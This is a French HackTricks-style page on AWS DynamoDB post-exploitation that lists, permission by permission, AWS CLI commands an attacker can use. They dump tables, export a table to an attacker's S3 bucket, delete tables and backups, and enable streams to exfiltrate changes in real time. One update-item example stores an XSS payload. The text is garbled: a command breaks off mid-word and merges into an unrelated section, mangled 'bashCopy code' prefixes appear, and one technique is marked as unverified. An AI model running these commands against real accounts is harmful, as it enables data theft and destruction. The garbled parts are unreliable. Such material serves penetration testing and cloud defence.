# AWS - Post-exploitation DynamoDB

<details>

<summary><strong>Soutenez HackTricks et b√©n√©ficiez d'avantages !</strong></summary>

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou si vous souhaitez acc√©der √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez** üí¨ [**le groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## DynamoDB

Pour plus d'informations, consultez :

{% content-ref url="../aws-services/aws-databases/aws-dynamodb-enum.md" %}
[aws-dynamodb-enum.md](../aws-services/aws-databases/aws-dynamodb-enum.md)
{% endcontent-ref %}

### `dynamodb:BatchGetItem`

Un attaquant disposant de ces autorisations sera en mesure de **r√©cup√©rer des √©l√©ments des tables par la cl√© primaire** (vous ne pouvez pas simplement demander toutes les donn√©es de la table). Cela signifie que vous devez conna√Ætre les cl√©s primaires (vous pouvez les obtenir en obtenant les m√©tadonn√©es de la table (`describe-table`).

{% tabs %}
{% tab title="fichier json" %}
{% code overflow="wrap" %}
```bash
aws dynamodb batch-get-item --request-items file:///tmp/a.json

// Avec a.json
{
    "ProductCatalog" : { // C'est le nom de la table
        "Keys": [
            {
            "Id" : { // Noms des cl√©s primaires
                "N": "205" // Valeur √† rechercher, vous pouvez mettre ici des entr√©es de 1 √† 1000 pour tout d√©verser
            }
            }
        ]
    }
}
```
{% endcode %}
{% endtab %}

{% tab title="en ligne" %}
{% code overflow="wrap" %}
```bash
aws dynamodb batch-get-item \
    --request-items '{"TargetTable": {"Keys": [{"Id": {"S": "item1"}}, {"Id": {"S": "item2"}}]}}' \
    --region <region>
```
{% endcode %}
{% endtab %}
{% endtabs %}



**Impact potentiel :** Privesc indirect en localisant des informations sensibles dans la table

### `dynamodb:GetItem`

**Similaire aux autorisations pr√©c√©dentes**, celle-ci permet √† un attaquant potentiel de lire des valeurs √† partir d'une seule table en donnant la cl√© primaire de l'entr√©e √† r√©cup√©rer :

{% code overflow="wrap" %}
```json
aws dynamodb get-item --table-name ProductCatalog --key  file:///tmp/a.json

// Avec a.json
{ 
"Id" : { 
    "N": "205"
}
}
```
{% endcode %}

Avec cette autorisation, il est √©galement possible d'utiliser la m√©thode **`transact-get-items`** comme :

```json
aws dynamodb transact-get-items \
    --transact-items file:///tmp/a.json

// Avec a.json
[
    {
        "Get": {
            "Key": {
                "Id": {"N": "205"}
            },
            "TableName": "ProductCatalog"
        }
    }
]
```

**Impact potentiel :** Privesc indirect en localisant des informations sensibles dans la table

### `dynamodb:Query`

**Similaire aux autorisations pr√©c√©dentes**, celle-ci permet √† un attaquant potentiel de lire des valeurs √† partir d'une seule table en donnant la cl√© primaire de l'entr√©e √† r√©cup√©rer. Elle permet d'utiliser un [sous-ensemble de comparaisons](https://docs.aws.amazon.com/amazondynamodb/latest/APIReference/API\_Condition.html), mais la seule comparaison autoris√©e avec la cl√© primaire (qui doit appara√Ætre) est "EQ", donc vous ne pouvez pas utiliser une comparaison pour obtenir toute la base de donn√©es en une seule requ√™te.

{% tabs %}
{% tab title="fichier json" %}
{% code overflow="wrap" %}
```bash
aws dynamodb query --table-name ProductCatalog --key-conditions file:///tmp/a.json
 
 // Avec a.json
 { 
"Id" : { 
    "ComparisonOperator":"EQ",
    "AttributeValueList": [ {"N": "205"} ]
    }
}
```
{% endcode %}
{% endtab %}

{% tab title="en ligne" %}
```bash
aws dynamodb query \
    --table-name TargetTable \
    --key-condition-expression "AttributeName = :value" \
    --expression-attribute-values '{":value":{"S":"TargetValue"}}' \
    --region <region>
```
{% endtab %}
{% endtabs %}

**Impact potentiel :** Privesc indirect en localisant des informations sensibles dans la table

### `dynamodb:Scan`

Vous pouvez utiliser cette autorisation pour **d√©verser facilement toute la table**.

```bash
aws dynamodb scan --table-name <t_name> #Obtenir les donn√©es √† l'int√©rieur de la table
```

**Impact potentiel :** Privesc indirect en localisant des informations sensibles dans la table

### `dynamodb:PartiQLSelect`

Vous pouvez utiliser cette autorisation pour **d√©verser facilement toute la table**.

```bash
aws dynamodb execute-statement \
    --statement "SELECT * FROM ProductCatalog"
```

Cette autorisation permet √©galement d'effectuer des `batch-execute-statement` comme :

```bash
aws dynamodb batch-execute-statement \
    --statements '[{"Statement": "SELECT * FROM ProductCatalog WHERE Id = 204"}]'
```

mais vous devez sp√©cifier la cl√© primaire avec une valeur, donc ce n'est pas tr√®s utile.

**Impact potentiel :** Privesc indirect en localisant des informations sensibles dans la table

### `dynamodb:ExportTableToPointInTime|(dynamodb:UpdateContinuousBackups)`

Cette autorisation permet √† un attaquant d'**exporter toute la table vers un bucket S3** de son choix :

```bash
aws dynamodb export-table-to-point-in-time \
    --table-arn arn:aws:dynamodb:<region>:<account-id>:table/TargetTable \
    --s3-bucket <attacker_s3_bucket> \
    --s3-prefix <optional_prefix> \
    --export-time <point_in_time> \
    --region <region>
```

Notez que pour que cela fonctionne, la table doit avoir la r√©cup√©ration √† un instant donn√© activ√©e, vous pouvez v√©rifier si la table l'a avec :

```bash
aws dynamodb describe-continuous-backups \
  --table-name <tablename>
```

Si elle n'est pas activ√©e, vous devrez l'**activer** et pour cela, vous avez besoin de l'autorisation **`dynamodb:ExportTableToPointInTime`** :

```bash
aws dynamodb update-continuous-backups \
    --table-name <value> \
    --point-in-time-re
### Avec key.json:
{
    "Id": {
        "S": "1000"
    }
}
### et val.json
{
    ":value": {
        "S": "<script>alert(1)</script>"
    }
}
```
{% endcode %}
{% endtab %}

{% tab title="Exemple IA" %}
```bash
aws dynamodb update-item \
    --table-name ExampleTable \
    --key '{"Id": {"S": "1"}}' \
    --update-expression "SET Attribute1 = :val1, Attribute2 = :val2" \
    --expression-attribute-values '{":val1": {"S": "NewValue1"}, ":val2": {"S": "NewValue2"}}' \
    --region <region>
```
{% endtab %}
{% endtabs %}

**Impact potentiel:** Exploitation de vuln√©rabilit√©s/bypass suppl√©mentaires en √©tant capable d'ajouter/modifier des donn√©es dans une table DynamoDB

### `dynamodb:DeleteTable`

Un attaquant avec cette permission peut **supprimer une table DynamoDB, causant une perte de donn√©es**.

```bash
aws dynamodb delete-table \
    --table-name TargetTable \
    --region <region>
```

**Impact potentiel**: Perte de donn√©es et perturbation des services qui d√©pendent de la table supprim√©e.

### `dynamodb:DeleteBackup`

Un attaquant avec cette permission peut **supprimer une sauvegarde DynamoDB, causant potentiellement une perte de donn√©es en cas de sc√©nario de r√©cup√©ration apr√®s sinistre**.

```bash
aws dynamodb delete-backup \
    --backup-arn arn:aws:dynamodb:<region>:<account-id>:table/TargetTable/backup/BACKUP_ID \
    --region <region>
```

**Impact potentiel**: Perte de donn√©es et incapacit√© √† r√©cup√©rer √† partir d'une sauvegarde lors d'un sc√©nario de r√©cup√©ration apr√®s sinistre.

### `dynamodb:StreamSpecification`, `dynamodb:UpdateTable`, `dynamodb:DescribeStream`, `dynamodb:GetShardIterator`, `dynamodb:GetRecords`

{% hint style="info" %}
TODO: V√©rifier si cela fonctionne r√©ellement
{% endhint %}

Un attaquant avec ces permissions peut **activer un flux sur une table DynamoDB, mettre √† jour la table pour commencer √† diffuser les modifications, puis acc√©der au flux pour surveiller les modifications de la table en temps r√©el**. Cela permet √† l'attaquant de surveiller et d'exfiltrer les modifications de donn√©es, ce qui peut entra√Æner une fuite de donn√©es.

1. Activer un flux sur une table DynamoDB:

```bash
bashCopy codeaws dynamodb update-table \
    --table-name TargetTable \
    --stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES \
    --region <region>
```

2. D√©crire le flux pour obtenir l'ARN et d'autres d√©tails:

```bash
bashCopy codeaws dynamodb describe-stream \
    --table-name TargetTable \
    --region <region>
```

3. Obtenir l'it√©rateur de shard en utilisant l'ARN du flux:

```bash
bashCopy codeaws dynamodbstreams get-shard-iterator \
    --stream-arn <stream_arn> \
    --shard-id <shard_id> \
    --shard-iterator-type LATEST \
    --region <region>
```

4. Utiliser l'it√©rateur de shard pour acc√©der et exfiltrer des donn√©es du flux:

```bash
bashCopy codeaws dynamodbstreams get-records \
    --shard-iterator <shard_iterator> \
    --region <region>
```

**Impact potentiel**: Surveillance en temps r√©el et fuite de donn√©es des modifications de la table DynamoDB.